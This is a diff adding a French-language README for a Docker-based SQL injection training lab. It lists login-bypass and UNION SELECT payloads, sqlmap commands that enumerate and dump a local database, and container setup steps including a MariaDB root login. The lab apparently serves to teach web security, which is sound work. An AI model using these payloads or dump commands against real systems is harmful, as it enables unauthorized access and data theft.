@@ -1,0 +1,74 @@
+# Docker Injection SQL
+
+![](readme_docs/287167c6.png)
+
+Container Docker pour suivre le cours Injection SQL
+
+# Injections SQL possibles
+
+## Authentification sans mot de passe
+
+`' or 1=1 -- `
+
+> Ne pas oublier l'espace à la fin
+
+## Enumération des utilisateurs
+
+`' or 1=1 UNION SELECT * FROM users -- `
+
+## Insertion d'un utilisateur dans la table users
+
+`' or 1=1 UNION SELECT 'admin', 'admin', 'admin', 'admin' -- `
+
+# SQLMap
+
+sqlmap -u http://127.0.0.1:8000 --forms --dbs
+
+![](readme_docs/86043759.png)
+
+sqlmap -u http://127.0.0.1:8000 --forms --tables -D db_name
+
+![](readme_docs/8f6b0a65.png)
+
+sqlmap -u http://127.0.0.1:8000 --forms --dump -D db_name -T table_name
+
+![](readme_docs/3137fd85.png)
+
+# Lancement
+
+Clonez le dépôt
+
+```bash
+git clone 
+```
+
+Lancez le container
+
+```bash
+bin/start
+```
+
+Accédez au shell du container MySQL
+
+```bash
+bin/shell
+```
+
+![](readme_docs/d0107619.png)
+
+Lancement du client mysql (saisissez le mot de passe **root**)
+
+```bash
+root@94416fbdf8e8:/# mysql -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 7
+Server version: 10.7.3-MariaDB-1:10.7.3+maria~focal mariadb.org binary distribution
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+
